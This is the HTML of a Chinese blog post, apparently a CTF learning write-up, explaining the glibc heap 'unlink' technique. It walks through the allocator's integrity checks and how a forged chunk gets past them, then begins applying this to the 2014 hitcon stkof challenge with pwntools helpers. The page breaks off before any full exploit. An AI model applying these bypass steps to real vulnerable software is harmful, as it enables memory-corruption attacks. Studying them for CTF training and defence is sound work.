@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.1","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="一、 Unlink介绍Unlink被定义为一个宏（高版本libc中被定义为了静态函数 unlink_chunk)，其源码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&#x2F;*  * 从双向链表中安全移除节点P的宏 * AV: 分配区指针，用于错误处理">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Unlink">
+<meta property="og:url" content="http://example.com/2025/06/17/Unlink%E8%AF%A6%E8%A7%A3/index.html">
+<meta property="og:site_name" content="PWN好难学">
+<meta property="og:description" content="一、 Unlink介绍Unlink被定义为一个宏（高版本libc中被定义为了静态函数 unlink_chunk)，其源码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&#x2F;*  * 从双向链表中安全移除节点P的宏 * AV: 分配区指针，用于错误处理">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011235981.png">
+<meta property="og:image" content="http://example.com/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011244292.png">
+<meta property="og:image" content="http://example.com/Unlink%E8%AF%A6%E8%A7%A3/image-20250617005504217.png">
+<meta property="og:image" content="http://example.com/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011402635.png">
+<meta property="og:image" content="http://example.com/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011426223.png">
+<meta property="og:image" content="http://example.com/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011434419.png">
+<meta property="og:image" content="http://example.com/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011440515.png">
+<meta property="og:image" content="http://example.com/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011446181.png">
+<meta property="og:image" content="http://example.com/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011454200.png">
+<meta property="og:image" content="http://example.com/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011501083.png">
+<meta property="og:image" content="http://example.com/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011508665.png">
+<meta property="article:published_time" content="2025-06-16T16:44:54.000Z">
+<meta property="article:modified_time" content="2025-06-16T17:15:21.375Z">
+<meta property="article:author" content="Fa1lSnow">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="unlink">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011235981.png">
+
+
+<link rel="canonical" href="http://example.com/2025/06/17/Unlink%E8%AF%A6%E8%A7%A3/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2025/06/17/Unlink%E8%AF%A6%E8%A7%A3/","path":"2025/06/17/Unlink详解/","title":"Unlink"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Unlink | PWN好难学</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">PWN好难学</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"> Fa1lSnow的小玩意</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81-Unlink%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">一、 Unlink介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81-%E4%BF%9D%E6%8A%A4%E5%92%8C%E9%99%90%E5%88%B6"><span class="nav-number">2.</span> <span class="nav-text">二、 保护和限制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-chunksize-P-prev-size-next-chunk-P"><span class="nav-number">2.1.</span> <span class="nav-text">1. chunksize(P) &#x3D;&#x3D; prev_size(next_chunk(P))</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-fd-bk-P-bk-fd-P"><span class="nav-number">2.2.</span> <span class="nav-text">2. fd-&gt;bk &#x3D;&#x3D; P &amp;&amp; bk -&gt; fd &#x3D;&#x3D; P</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-not-small"><span class="nav-number">2.3.</span> <span class="nav-text">3. not small</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81-%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">3.</span> <span class="nav-text">三、 适用场景及绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%88%E4%B8%80%E8%88%AC%E6%9D%A5%E8%AF%B4%EF%BC%89"><span class="nav-number">3.0.1.</span> <span class="nav-text">适用场景（一般来说）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E7%BB%95%E8%BF%87%EF%BC%88%E4%BB%A5%E4%B8%8A%E9%9D%A2%E8%AE%B2%E7%9A%84%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="nav-number">3.0.2.</span> <span class="nav-text">保护绕过（以上面讲的适用场景为例）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E3%80%81-%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">四、 例题分析</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Fa1lSnow"
+      src="/uploads/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Fa1lSnow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/06/17/Unlink%E8%AF%A6%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="Fa1lSnow">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="PWN好难学">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Unlink | PWN好难学">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Unlink
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2025-06-17 00:44:54 / Modified: 01:15:21" itemprop="dateCreated datePublished" datetime="2025-06-17T00:44:54+08:00">2025-06-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="一、-Unlink介绍"><a href="#一、-Unlink介绍" class="headerlink" title="一、 Unlink介绍"></a>一、 Unlink介绍</h1><p>Unlink被定义为一个宏（高版本libc中被定义为了静态函数 <code>unlink_chunk</code>)，其源码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * 从双向链表中安全移除节点P的宏</span></span><br><span class="line"><span class="comment"> * AV: 分配区指针，用于错误处理</span></span><br><span class="line"><span class="comment"> * P: 要移除的节点指针</span></span><br><span class="line"><span class="comment"> * BK: 临时存储后驱节点指针</span></span><br><span class="line"><span class="comment"> * FD: 临时存储前驱节点指针</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    <span class="comment">/* 获取P的前驱和后继节点 */</span>                                      </span><br><span class="line">    FD = P-&gt;fd;								      </span><br><span class="line">    BK = P-&gt;bk;								      </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 验证前后节点指针的完整性：前驱的后继和后继的前驱必须都指向P */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 链表完整性验证通过，执行移除操作 */</span>      </span><br><span class="line">    <span class="keyword">else</span> &#123;								      </span><br><span class="line">        <span class="comment">/* 基本链表操作：让前驱和后继互相指向，跳过P */</span>  </span><br><span class="line">        FD-&gt;bk = BK;							      </span><br><span class="line">        BK-&gt;fd = FD;							      </span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* 处理非small bin的特殊情况（large bins可能有额外的大小链表） */</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;		      </span><br><span class="line">            <span class="comment">/* 检查大小链表的完整性 */</span></span><br><span class="line">	    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)	      </span><br><span class="line">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">	      malloc_printerr (check_action,				      </span><br><span class="line">			       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">			       P, AV);					      </span><br><span class="line">            </span><br><span class="line">            <span class="comment">/* 如果后继节点的大小链表指针为空，需要重建 */</span>      </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				      </span><br><span class="line">                <span class="comment">/* 情况1：P是唯一节点，让后继节点自环 */</span>      </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				      </span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      </span><br><span class="line">                <span class="comment">/* 情况2：将P的大小链表指针转移给后继节点 */</span></span><br><span class="line">                <span class="keyword">else</span> &#123;							      </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD; <span class="comment">/* 更新后节点的后驱 */</span>      </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD; <span class="comment">/* 更新前节点的前驱 */</span>      </span><br><span class="line">                  &#125;							      </span><br><span class="line">              &#125; </span><br><span class="line">            <span class="comment">/* 如果后继已有大小链表指针，直接跳过P */</span>      </span><br><span class="line">            <span class="keyword">else</span> &#123;							      </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      </span><br><span class="line">              &#125;								      </span><br><span class="line">          &#125;								      </span><br><span class="line">      &#125;									      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Unlink是堆管理中的一个操作，用于将一个chunk从<strong>双向链表</strong>中取出。触发unlink，往往是通过free物理相邻的下一块chunk，检查到该chunk的上一块处于free状态（size的prev_inuse为0)，就用unlink将上一块脱链后合并。</p>
+<p>实现过程如下图。（图画的丑陋，别喷）<br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011235981.png" alt="image-20250617011235981"><br>当我们执行Unlink将chunk2从双向链表中取出的时候，这个双向链表就变成下面这个样子。<br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011244292.png" alt="image-20250617011244292"></p>
+<p><strong>漏洞点：</strong> 如果我们可以伪造chunk2，通过<strong>控制fd和bk的值</strong>，我们似乎就可以实现任意地址写。<br>但是事情并非如此简单，通过上面给出的源码可以看到，Unlink内部做了许多保护和限制，下面我们就来研究这些保护以及限制。</p>
+<h1 id="二、-保护和限制"><a href="#二、-保护和限制" class="headerlink" title="二、 保护和限制"></a>二、 保护和限制</h1><h2 id="1-chunksize-P-prev-size-next-chunk-P"><a href="#1-chunksize-P-prev-size-next-chunk-P" class="headerlink" title="1. chunksize(P) &#x3D;&#x3D; prev_size(next_chunk(P))"></a>1. chunksize(P) &#x3D;&#x3D; prev_size(next_chunk(P))</h2><p>这部分检测源码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 获取下一个块的指针 */</span></span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line"><span class="comment">/* 检查下一个块的prev_size是否等于当前块size */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect(nextchunk-&gt;prev_size != size, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这部分检测检查的是下一个chunk的prev_size是否和当前堆块的prev_size相等（这是free函数中的检测）</p>
+</blockquote>
+<h2 id="2-fd-bk-P-bk-fd-P"><a href="#2-fd-bk-P-bk-fd-P" class="headerlink" title="2. fd-&gt;bk &#x3D;&#x3D; P &amp;&amp; bk -&gt; fd &#x3D;&#x3D; P"></a>2. fd-&gt;bk &#x3D;&#x3D; P &amp;&amp; bk -&gt; fd &#x3D;&#x3D; P</h2><p>这部分检测源码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 验证前后节点指针的完整性：前驱的后继和后继的前驱必须都指向P */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      </span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 链表完整性验证通过，执行移除操作 */</span>      </span><br><span class="line">  <span class="keyword">else</span> &#123;								      </span><br><span class="line">      <span class="comment">/* 基本链表操作：让前驱和后继互相指向，跳过P */</span>  </span><br><span class="line">      FD-&gt;bk = BK;							      </span><br><span class="line">      BK-&gt;fd = FD;							     </span><br></pre></td></tr></table></figure>
+<p>其实就是在检测这个双向链表的结构是否完整。</p>
+<h2 id="3-not-small"><a href="#3-not-small" class="headerlink" title="3. not small"></a>3. not small</h2><p>这部分检测源码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 处理非small bin的特殊情况（large bins可能有额外的大小链表） */</span></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				      </span><br><span class="line">          &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;		      </span><br><span class="line">          <span class="comment">/* 检查大小链表的完整性 */</span></span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)	      </span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">     malloc_printerr (check_action,				      </span><br><span class="line">	       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">	       P, AV);					      </span><br></pre></td></tr></table></figure>
+<p>简单来说，如果chunk的大小落在largebin范围内，就会进行对nextsize的检查</p>
+<h1 id="三、-适用场景及绕过方法"><a href="#三、-适用场景及绕过方法" class="headerlink" title="三、 适用场景及绕过方法"></a>三、 适用场景及绕过方法</h1><h3 id="适用场景（一般来说）"><a href="#适用场景（一般来说）" class="headerlink" title="适用场景（一般来说）"></a>适用场景（一般来说）</h3><ol>
+<li>有一个list专门用于存户malloc得到的指针</li>
+<li>存在溢出漏洞</li>
+</ol>
+<h3 id="保护绕过（以上面讲的适用场景为例）"><a href="#保护绕过（以上面讲的适用场景为例）" class="headerlink" title="保护绕过（以上面讲的适用场景为例）"></a>保护绕过（以上面讲的适用场景为例）</h3><p><strong>保护1</strong><br>通过<strong>溢出</strong>，对下一个堆块进行修改，使得下一个堆块的<strong>prev_size &#x3D; fackchcunk的size，prev_inuse &#x3D; 0</strong><br><strong>保护2</strong><br>对于保护2，可以通过构造facck chunk来绕过。<br>chunk_list存在的时候，我们做以下构造<br>fack chunk的fd指向 存放当前堆块指针的地址 -0x18（bk指针相对于chunk头的偏移是0x18)<br>fack chunk的bk指向 存放当前堆块指针的地址 -0x10（fd指针相对于chunk头的偏移是0x10)<br>这样就实现了 fack_chunk的fd指向的“chunk”的bk指向它，fack_chunk的bk指向的“chunk”指向它，从而成功绕过检测。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fakeFD -&gt; bk == P1 *(&amp;fakeFD + <span class="number">0x18</span>) == P1 *fakeFD == &amp;P1 - <span class="number">0x18</span></span><br><span class="line">fakeBK -&gt; fd == P1 *(&amp;fakeBK + <span class="number">0x10</span>) == P1 *fakeBK == &amp;P1 - <span class="number">0x10</span></span><br></pre></td></tr></table></figure>
+<p><strong>保护3</strong><br>更简单了，直接不申请largebin大小的chunk即可。</p>
+<h1 id="四、-例题分析"><a href="#四、-例题分析" class="headerlink" title="四、 例题分析"></a>四、 例题分析</h1><p>题目来源：<a target="_blank" rel="noopener" href="https://wwyq.lanzouo.com/imJ0k2qa2ykf" title="[2014_hitccon_stkof]">[2014_hitccon_stkof]</a><br>先检查一下保护，看一下文件的ELF信息</p>
+<p>可以看到是64位小端序，开启了canary和nx，got表可写<br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617005504217.png" alt="image-20250617005504217"></p>
+<p>丢到ida里面看一看（为了方便查看，改了一些函数和变量的名字）<br>main函数<br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011402635.png" alt="image-20250617011402635"></p>
+<p>creat函数<br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011426223.png" alt="image-20250617011426223"></p>
+<p>delete函数<br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011434419.png" alt="image-20250617011434419"></p>
+<p>edit函数<br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011440515.png" alt="image-20250617011440515"></p>
+<p>还有一个没什么用的函数，这里就不管他了。<br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011446181.png" alt="image-20250617011446181"></p>
+<p>通过分析程序的主要函数，我们发现申请的堆块的指针都在存放在bss段的一个数组（后面叫做list）中，并且edit函数输入的字节数目由我们自己控制，所以存在溢出。所以这道题可以用unlink来做。<br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011454200.png" alt="image-20250617011454200"><br><strong>前置准备：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choicce</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choicce).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br></pre></td></tr></table></figure>
+<p>所以思路就很清晰了：<br>我们先申请四个堆块（第一个用后续操作，第二个就是我们用来制作fack chunk的，第三个用来触发unlink，堆块四用来chunk防止与top chunk合并）</p>
